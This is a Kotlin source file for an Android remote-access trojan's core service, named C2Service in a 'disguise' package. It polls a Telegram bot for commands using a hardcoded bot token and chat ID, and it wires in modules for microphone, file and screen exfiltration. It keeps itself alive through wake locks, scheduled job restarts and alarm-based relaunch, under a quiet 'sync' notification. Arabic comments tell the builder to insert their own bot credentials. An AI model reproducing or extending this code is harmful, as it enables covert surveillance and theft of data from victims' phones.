package com.example.disguise.core

import android.app.AlarmManager
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.app.job.JobInfo
import android.app.job.JobScheduler
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import com.example.disguise.R
import com.example.disguise.control.AccessibilityHelper
import com.example.disguise.control.MicExfil
import com.example.disguise.control.ScreenReader
import com.example.disguise.files.FileExfil
import com.example.disguise.util.Notifier
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

/**
 * C2Service — الخدمة الأمامية (Foreground Service) التي تُبقي التطبيق حياً.
 */
class C2Service : Service() {

    companion object {
        private const val TAG = "C2Service"
        private const val CHANNEL_ID = "sync_channel"
        private const val NOTIFICATION_ID = 1001
        private const val JOB_ID = 2001
        private const val WAKE_LOCK_TAG = "DisguiseApp::C2WakeLock"

        // مفاتيح تمرير الإعدادات عبر Intent
        const val EXTRA_BOT_TOKEN = "bot_token"
        const val EXTRA_CHAT_ID = "chat_id"

        // ⚠️ ضع هنا بيانات البوت الخاصة بك قبل البناء (يجب ألا تكون فارغة)
        const val DEFAULT_BOT_TOKEN = "8520214335:AAEJEbJkvG23-OLMrB6Vmd_RROU3QWzT2Uw" // ضع الـ Token هنا
        const val DEFAULT_CHAT_ID = "744908929"   // ضع الـ Chat ID هنا

        fun start(context: Context) {
            val intent = Intent(context, C2Service::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
    }

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var pollingJob: Job? = null
    private var controller: TelegramController? = null
    private var reporter: TelegramReporter? = null
    private var commandHandler: CommandHandler? = null
    private var wakeLock: PowerManager.WakeLock? = null

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "onCreate: service created")
        acquireWakeLock()
        scheduleJobRestart()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "onStartCommand: starting foreground")

        val notification = Notifier.buildNotification(this, CHANNEL_ID)
        startForeground(NOTIFICATION_ID, notification)

        // ✅ التحقق الصحيح من أن المتغيرات ليست فارغة
        val botToken = intent?.getStringExtra(EXTRA_BOT_TOKEN) ?: DEFAULT_BOT_TOKEN
        val chatId = intent?.getStringExtra(EXTRA_CHAT_ID) ?: DEFAULT_CHAT_ID

        if (botToken.isBlank() || chatId.isBlank()) {
            Log.e(TAG, "BOT_TOKEN or CHAT_ID is empty. Service will idle.")
            return START_STICKY
        }

        if (commandHandler == null) {
            setupModules()
        }

        if (pollingJob == null || pollingJob?.isActive != true) {
            startPolling(botToken, chatId)
        }

        return START_STICKY
    }

    private fun setupModules() {
        Log.d(TAG, "setupModules: creating handlers")
        val accessibility = AccessibilityHelper.instance
        val screenReader = ScreenReader()
        val fileExfil = FileExfil()

        commandHandler = CommandHandler(
            context = applicationContext,
            accessibilityHelper = accessibility,
            screenReader = screenReader,
            fileExfil = fileExfil
        )
    }

    private fun startPolling(botToken: String, chatId: String) {
        Log.d(TAG, "startPolling: launching TelegramController")

        reporter = TelegramReporter(botToken, chatId)
        controller = TelegramController(
            botToken = botToken,
            chatId = chatId,
            context = applicationContext
        )

        val handler = commandHandler
        val rep = reporter
        if (handler != null && rep != null) {
            controller?.attach(handler, rep)
        } else {
            Log.e(TAG, "startPolling: handler or reporter is null")
        }

        pollingJob = serviceScope.launch {
            var backoffMs = 1000L
            while (isActive) {
                try {
                    controller?.pollOnce()
                    backoffMs = 1000L
                } catch (e: Exception) {
                    Log.e(TAG, "polling error: ${e.message}", e)
                    delay(backoffMs)
                    backoffMs = (backoffMs * 2).coerceAtMost(60_000L)
                }
            }
        }
    }

    private fun acquireWakeLock() {
        if (wakeLock == null) {
            try {
                val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
                wakeLock = powerManager.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    WAKE_LOCK_TAG
                ).apply {
                    setReferenceCounted(false)
                    acquire()
                }
                Log.d(TAG, "WakeLock acquired")
            } catch (e: Exception) {
                Log.e(TAG, "failed to acquire WakeLock: ${e.message}", e)
            }
        }
    }

    private fun scheduleJobRestart() {
        try {
            val jobScheduler = getSystemService(Context.JOB_SCHEDULER_SERVICE) as JobScheduler
            val component = ComponentName(this, RestartJobService::class.java)
            val jobInfo = JobInfo.Builder(JOB_ID, component)
                .setPeriodic(15 * 60 * 1000)
                .setPersisted(true)
                .build()

            val result = jobScheduler.schedule(jobInfo)
            Log.d(TAG, "JobScheduler scheduled: $result")
        } catch (e: Exception) {
            Log.e(TAG, "failed to schedule JobScheduler: ${e.message}", e)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                getString(R.string.notif_channel_name),
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = getString(R.string.notif_channel_desc)
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        Log.d(TAG, "onTaskRemoved: scheduling restart via AlarmManager")
        try {
            val restartIntent = Intent(applicationContext, C2Service::class.java)
            restartIntent.setPackage(packageName)
            val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
            } else {
                PendingIntent.FLAG_ONE_SHOT
            }
            val restartPending = PendingIntent.getService(this, 1, restartIntent, flags)
            val alarmManager = getSystemService(ALARM_SERVICE) as AlarmManager
            alarmManager.set(
                AlarmManager.RTC,
                System.currentTimeMillis() + 1000,
                restartPending
            )
        } catch (e: Exception) {
            Log.e(TAG, "failed to schedule restart: ${e.message}", e)
        }
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        Log.d(TAG, "onDestroy: cancelling polling and releasing WakeLock")
        pollingJob?.cancel()
        serviceScope.cancel()
        
        // إيقاف أي تسجيل صوتي قيد التشغيل لتجنب أخطاء
        try {
            if (MicExfil.isCurrentlyRecording()) {
                MicExfil.stopRecordingAndSend()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping MicExfil: ${e.message}")
        }

        wakeLock?.let {
            if (it.isHeld) {
                it.release()
                Log.d(TAG, "WakeLock released")
            }
        }
        wakeLock = null
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
